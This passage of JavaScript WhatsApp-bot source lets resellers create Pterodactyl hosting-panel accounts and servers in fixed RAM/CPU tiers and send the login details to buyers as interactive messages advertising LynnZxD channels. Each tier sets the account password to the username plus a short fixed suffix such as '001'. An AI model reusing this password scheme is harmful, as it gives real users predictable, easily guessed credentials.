◦ Group² : https://chat.whatsapp.com/BvslVKmqBukIhQBlKnMVM9`)
}
break
case "4gb": {
        if (!isPrem) return reply(`ᴋʜᴜꜱᴜꜱ ʀᴇꜱᴇʟʟᴇʀ ᴘᴀɴᴇʟ ᴋᴀʟᴏ ᴍᴀᴜ ʙᴜʏ ᴋᴇ wa.me/6283167532721`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "100"
let disk = "4048"
let email = username + "@lynnzxd.com"
let d = (await slime.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat`)
let ctf = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.username}
* *Ram :* ${memo}
* *Cpu :* ${cpu}%
* *Storage :* ${disk}
* *Created :* ${tanggal2}

*Rules Pembelian Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Saya Hanya*
        *Mengirim 1 Kali !*
* *Data Hilang/Lupa*
        *Akun, Saya Tidak Akan*
        *Bertanggung Jawab !*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Bawa Bukti Ss Chat Saat*
        *Pembelian*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© LynnZxD`
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Group Marketplace","url":"https://lynnzxd.carrd.co/#","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Login Server Panel","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Username",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Password",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363325328533494@newsletter",
newsletterName: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ LynnZxD",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await slime.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"name": name,
"description": "ᴘᴏᴡᴇʀᴇᴅ ʙʏ LynnZxD",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*Jangan Lupa Join Sini Bro*\n
◦ All Info : https://lynnzxd.carrd.co/#
     
◦ Saluran : https://whatsapp.com/channel/0029VaoNzzlJJhzQTJBL5n0F
     
◦ Group¹ : https://whatsapp.com/channel/0029ValkS8dL2AU0eVX9oP3m
     
◦ Group² : https://chat.whatsapp.com/BvslVKmqBukIhQBlKnMVM9`)
}
break
case "5gb": {
    if (!isPrem) return reply(`ᴋʜᴜꜱᴜꜱ ʀᴇꜱᴇʟʟᴇʀ ᴘᴀɴᴇʟ ᴋᴀʟᴏ ᴍᴀᴜ ʙᴜʏ ᴋᴇ wa.me/6283167532721`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "120"
let disk = "5138"
let email = username + "@lynnzxd.com"
let d = (await slime.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat`)
let ctf = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.username}
* *Ram :* ${memo}
* *Cpu :* ${cpu}%
* *Storage :* ${disk}
* *Created :* ${tanggal2}

*Rules Pembelian Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Saya Hanya*
        *Mengirim 1 Kali !*
* *Data Hilang/Lupa*
        *Akun, Saya Tidak Akan*
        *Bertanggung Jawab !*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Bawa Bukti Ss Chat Saat*
        *Pembelian*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© LynnZxD`
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Group Marketplace","url":"https://lynnzxd.carrd.co/#","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Login Server Panel","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Username",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Password",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363325328533494@newsletter",
newsletterName: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await slime.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"name": name,
"description": "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*Jangan Lupa Join Sini Bro*\n
◦ All Info : https://lynnzxd.carrd.co/#
     
◦ Saluran : https://whatsapp.com/channel/0029VaoNzzlJJhzQTJBL5n0F
     
◦ Group¹ : https://whatsapp.com/channel/0029ValkS8dL2AU0eVX9oP3m
     
◦ Group² : https://chat.whatsapp.com/BvslVKmqBukIhQBlKnMVM9`)
}
break
case "6gb": {
if (!isPrem) return reply(`*ᴋʜᴜꜱᴜꜱ ʀᴇꜱᴇʟʟᴇʀ ᴘᴀɴᴇʟ ᴋᴀʟᴏ ᴍᴀᴜ ʙᴜʏ ᴋᴇ wa.me/6283167532721`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "140"
let disk = "6000"
let email = username + "@lynnzxd.com"
let d = (await slime.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat`)
let ctf = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.username}
* *Ram :* ${memo}
* *Cpu :* ${cpu}%
* *Storage :* ${disk}
* *Created :* ${tanggal2}

*Rules Pembelian Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Saya Hanya*
        *Mengirim 1 Kali !*
* *Data Hilang/Lupa*
        *Akun, Saya Tidak Akan*
        *Bertanggung Jawab !*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Bawa Bukti Ss Chat Saat*
        *Pembelian*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© LynnZxD`
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Group Marketplace","url":"https://lynnzxd.carrd.co/#","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Login Server Panel","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Username",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Password",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363325328533494@newsletter",
newsletterName: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await slime.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"name": name,
"description": "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*Jangan Lupa Join Sini Bro*\n
◦ All Info : https://lynnzxd.carrd.co/#
     
◦ Saluran : https://whatsapp.com/channel/0029VaoNzzlJJhzQTJBL5n0F
     
◦ Group¹ : https://whatsapp.com/channel/0029ValkS8dL2AU0eVX9oP3m
     
◦ Group² : https://chat.whatsapp.com/BvslVKmqBukIhQBlKnMVM9`)
}
break
case "7gb": {
if (!isPrem) return reply(`ᴋʜᴜꜱᴜꜱ ʀᴇꜱᴇʟʟᴇʀ ᴘᴀɴᴇʟ ᴋᴀʟᴏ ᴍᴀᴜ ʙᴜʏ ᴋᴇ wa.me/6283167532721`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "160"
let disk = "7000"
let email = username + "@lynnzxd.com"
let d = (await slime.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "9"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat`)
let ctf = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.username}
* *Ram :* ${memo}
* *Cpu :* ${cpu}%
* *Storage :* ${disk}
* *Created :* ${tanggal2}

*Rules Pembelian Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Saya Hanya*
        *Mengirim 1 Kali !*
* *Data Hilang/Lupa*
        *Akun, Saya Tidak Akan*
        *Bertanggung Jawab !*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Bawa Bukti Ss Chat Saat*
        *Pembelian*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© LynnZxD`
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Group Marketplace","url":"https://lynnzxd.carrd.co/#","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Login Server Panel","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Username",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Password",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363325328533494@newsletter",
newsletterName: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await slime.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"name": name,
"description": "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*Jangan Lupa Join Sini Bro*\n
◦ All Info : https://lynnzxd.carrd.co/#
     
◦ Saluran : https://whatsapp.com/channel/0029VaoNzzlJJhzQTJBL5n0F
     
◦ Group¹ : https://whatsapp.com/channel/0029ValkS8dL2AU0eVX9oP3m
     
◦ Group² : https://chat.whatsapp.com/BvslVKmqBukIhQBlKnMVM9`)
}
break
case "unli": {
       if (!isPrem) return reply(`ᴋʜᴜꜱᴜꜱ ʀᴇꜱᴇʟʟᴇʀ ᴘᴀɴᴇʟ ᴋᴀʟᴏ ᴍᴀᴜ ʙᴜʏ ᴋᴇ wa.me/6283167532721`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@lynnzxd.com"
let d = (await slime.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat`)
let ctf = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.username}
* *Ram :* ${memo}
* *Cpu :* ${cpu}%
* *Storage :* ${disk}
* *Created :* ${tanggal2}

*Rules Pembelian Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Saya Hanya*
        *Mengirim 1 Kali !*
* *Data Hilang/Lupa*
        *Akun, Saya Tidak Akan*
        *Bertanggung Jawab !*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Bawa Bukti Ss Chat Saat*
        *Pembelian*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© LynnZxD`
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Group Marketplace","url":"https://lynnzxd.carrd.co/#","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Login Server Panel","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Username",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Password",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363325328533494@newsletter",
newsletterName: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await slime.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"name": name,
"description": "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Jangan Lupa Join Sini Bro*\n
◦ All Info : https://lynnzxd.carrd.co/#
     
◦ Saluran : https://whatsapp.com/channel/0029VaoNzzlJJhzQTJBL5n0F
     
◦ Group¹ : https://whatsapp.com/channel/0029ValkS8dL2AU0eVX9oP3m
     
◦ Group² : https://chat.whatsapp.com/BvslVKmqBukIhQBlKnMVM9`)
}
break
case "8gb": {
if (!isPrem) return reply(`ᴋʜᴜꜱᴜꜱ ʀᴇꜱᴇʟʟᴇʀ ᴘᴀɴᴇʟ ᴋᴀʟᴏ ᴍᴀᴜ ʙᴜʏ ᴋᴇ wa.me/6283167532721`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "180"
let disk = "8000"
let email = username + "@lynnzxd.com"
let d = (await slime.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "8"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat`)
let ctf = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.username}
* *Ram :* ${memo}
* *Cpu :* ${cpu}%
* *Storage :* ${disk}
* *Created :* ${tanggal2}

*Rules Pembelian Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Saya Hanya*
        *Mengirim 1 Kali !*
* *Data Hilang/Lupa*
        *Akun, Saya Tidak Akan*
        *Bertanggung Jawab !*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Bawa Bukti Ss Chat Saat*
        *Pembelian*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© LynnZxD`
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Group Marketplace","url":"https://lynnzxd.carrd.co/#","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Login Server Panel","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Username",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Password",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363325328533494@newsletter",
newsletterName: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await slime.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"name": name,
"description": "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*Jangan Lupa Join Sini Bro*\n
◦ All Info : https://lynnzxd.carrd.co/#
     
◦ Saluran : https://whatsapp.com/channel/0029VaoNzzlJJhzQTJBL5n0F
     
◦ Group¹ : https://whatsapp.com/channel/0029ValkS8dL2AU0eVX9oP3m
     
◦ Group² : https://chat.whatsapp.com/BvslVKmqBukIhQBlKnMVM9`)
}
break
case "ramlist":

lrm = `RAM YANG TERSEDIA :
1GB
2GB
3GB
4GB
5GB
6GB
7GB
8GB
UNLI`
slime.sendMessage(from, {text : lrm}, {quoted : fcall})
break 
case 'panel': {
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username2 = t[0];
let u2 = t[1];

let sections = [{
title: 'ʟɪsᴛ',
highlight_label: 'Recomended',
rows: [{
title: 'Unli',
description: `Unlimited Ram/Cpu`, 
id: `.unli ${username2},${u2}`
},
{
title: '1Gb', 
description: "1Gb Ram/40 Cpu", 
id: `.1gb ${username2},${u2}`
},
{
title: '2Gb', 
description: "2Gb Ram/60 Cpu", 
id: `.2gb ${username2},${u2}`
},
{
title: '3Gb', 
description: "3Gb Ram/80 Cpu", 
id: `.3gb ${username2},${u2}`
},
{
title: '4Gb', 
description: "4Gb Ram/100 Cpu", 
id: `.4gb ${username2},${u2}`
},
{
title: '5Gb', 
description: "5Gb Ram/120 Cpu", 
id: `.5gb ${username2},${u2}`
},
{
title: '6Gb', 
description: "6Gb Ram/140 Cpu", 
id: `.6gb ${username2},${u2}`
},
{
title: '7Gb', 
description: "7Gb Ram/160 Cpu", 
id: `.7gb ${username2},${u2}`
},
{
title: '8Gb', 
description: "8Gb Ram/180 Cpu", 
id: `.8gb ${username2},${u2}`
}]
}]

let listMessage = {
    title: 'List Panel', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363325328533494@newsletter',
 newsletterName: 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: slime.decodeJid(slime.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Please choose the size you want to buy`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
